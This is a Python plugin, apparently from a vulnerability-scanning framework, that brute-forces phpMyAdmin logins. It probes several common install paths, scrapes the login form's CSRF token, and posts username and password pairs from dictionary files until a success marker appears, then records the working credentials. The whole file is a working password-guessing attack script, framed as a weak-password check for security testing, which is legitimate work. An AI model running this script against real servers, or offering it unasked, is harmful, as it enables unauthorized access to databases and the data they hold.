#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import re
import urllib.request
import os
from lib.core.data import paths
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script, VUL_LEVEL, VUL_TYPE

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'phpmyadmin burst'
        self.keyword = ['phpmyadmin', 'burst', 'php']
        self.info = 'phpmyadmin burst'
        self.type = VUL_TYPE.WEAKPASS
        self.level = VUL_LEVEL.CRITICAL
        self.refer = 'https://github.com/ysrc/xunfeng/blob/master/vulscan/vuldb/phpmyadmin_crackpass.py'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            flag_list = ['src="navigation.php', 'frameborder="0" id="frame_content"', 'id="li_service_type">','class="disableAjax" title=']
            usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(os.path.join(paths.DICT_PATH, 'phpmyadmin_usernames.txt'))
            passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(os.path.join(paths.DICT_PATH, 'phpmyadmin_passwords.txt'))
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './phpmyadmin/'),
                self.url_normpath(self.base_url, '/phpmyadmin/'),
                self.url_normpath(self.url, './pmd/'),
                self.url_normpath(self.base_url, '/pmd/'),
                self.url_normpath(self.url, './'),
            ]))
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            async with ClientSession() as session:
                for path in path_list:
                    url = path + 'index.php'
                    async with session.get(url=url, headers=headers) as res1:
                        if res1:
                            text1 = await res1.text()
                            if 'input_password' in text1 and 'name="token"' in text1:
                                async for (username, password) in self.generate_dict(usernamedic, passworddic):
                                    async with session.get(url=url, headers=headers) as res2:
                                        if res2:
                                            text2 = await res2.text()
                                            token = re.search('name="token" value="(.*?)" />', text2)
                                            if token != None:
                                                # token_hash = token.group(1)
                                                token_hash = urllib.request.quote(token.group(1))
                                                postdata = "pma_username=%s&pma_password=%s&server=1&target=index.php&lang=zh_CN&collation_connection=utf8_general_ci&token=%s" % (
                                                    username, password, token_hash)
                                                async with session.post(url=url, data=postdata,
                                                                        headers=headers) as res3:
                                                    if res3:
                                                        text3 = await res3.text()
                                                        for flag in flag_list:
                                                            if flag in text3:
                                                                self.flag = 1
                                                                self.req.append(
                                                                    {"username": username, "password": password})
                                                                self.res.append({"info": url,
                                                                                 "key": ":".join([username, password])})
                                                                return
